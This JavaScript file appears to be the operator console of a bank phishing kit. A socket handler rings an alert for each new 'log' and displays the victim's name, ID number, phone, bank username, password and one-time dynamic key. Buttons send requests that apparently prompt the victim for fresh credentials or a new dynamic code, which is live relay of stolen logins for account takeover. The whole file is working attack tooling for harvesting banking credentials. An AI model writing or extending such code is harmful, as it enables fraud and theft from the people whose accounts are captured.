function generateTableRowLog(data) {
  return `
    <tr>
      <th scope="row">${data.fuente}</th>
      <td>${data.name}</td>
      <td>${data.reg}</td>
      <td>${data.cl}</td>
      <td>${data.us}</td>
      <td>${data.ps}</td>
      <td>${data.din}</td>
      <td>${data.status}</td>
      <td>${data.bn}</td>
    </tr>
  `;
}

function generateButtonsLogs(data) {
  const buttonActionsLogs = [
    { id: "us", label: "User", endpoint: "buttons/logsUs" },
    { id: "din", label: "Cdin", endpoint: "buttons/logdin" },
    { id: "newDin", label: "New Cdin", endpoint: "buttons/lognewdin" },
    { id: "end", label: "End", endpoint: "buttons/logsfinish" },
  ];

  return buttonActionsLogs
    .map(
      (action) =>
        `<button class="button" id="${action.id}-button-${data.cl}">${action.label}</button>`
    )
    .join("");
}

function attachButtonEventsLogs(data) {
  const buttonActionsLogs = [
    { id: "us", endpoint: "buttons/logsUs" },
    { id: "din", endpoint: "buttons/logdin" },
    { id: "newDin", endpoint: "buttons/lognewdin" },
    { id: "end", endpoint: "buttons/logsfinish" },
  ];

  buttonActionsLogs.forEach((action) => {
    const buttonLog = document.querySelector(`#${action.id}-button-${data.cl}`);
    buttonLog.addEventListener("click", function (event) {
      event.preventDefault();
      fetch(action.endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: data.cl }),
      })
        .then((response) => response.json())
        .then((result) => {
          console.log(result);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });
  });
}

function renderPanelLog(data, isActive) {
  const tableContentLog = generateTableRowLog(data);
  const buttonContentLog = isActive ? generateButtonsLogs(data) : "";

  return `
    <div class="${isActive ? "active" : ""} mb-3">
      <div class="table-responsive">
        <table class="table table-striped table-bordered table-sm text-muted">
          <thead class="small">
            <tr>
              <th scope="col">Fuente</th>
              <th scope="col">Nombre</th>
              <th scope="col">CC</th>
              <th scope="col">Teléfono</th>
              <th scope="col">Usuario</th>
              <th scope="col">Contraseña</th>
              <th scope="col">Dinámica</th>
              <th scope="col">Estado</th>
              <th scope="col">Banco</th>
            </tr>
          </thead>
          <tbody class="small">
            ${tableContentLog}
          </tbody>
        </table>
      </div>
      ${isActive ? `<div class="d-flex gap-3">${buttonContentLog}</div>` : ""}
    </div>
  `;
}

socket.on("new_log", function (data) {
  console.log("Nuevo log:", data);
  let audio = new Audio("../static/audio/timbre.mp3");

  let intervalId = setInterval(() => {
    audio.play().catch(function (error) {
      console.log("Error al reproducir el audio:", error);
    });
  }, 1000);

  setTimeout(() => {
    clearInterval(intervalId);
  }, 5000);

  const content = document.getElementById("on-info");
  let panel = document.getElementById("panel-" + data.cl);

  if (!panel) {
    console.log("No existe el panel");
    panel = document.createElement("div");
    panel.id = "panel-" + data.cl;
    content.appendChild(panel);
  }

  const isActive = data.status !== "Finalizado";
  panel.innerHTML = renderPanelLog(data, isActive);

  if (isActive) {
    attachButtonEventsLogs(data);
  }

  content.prepend(panel);
});
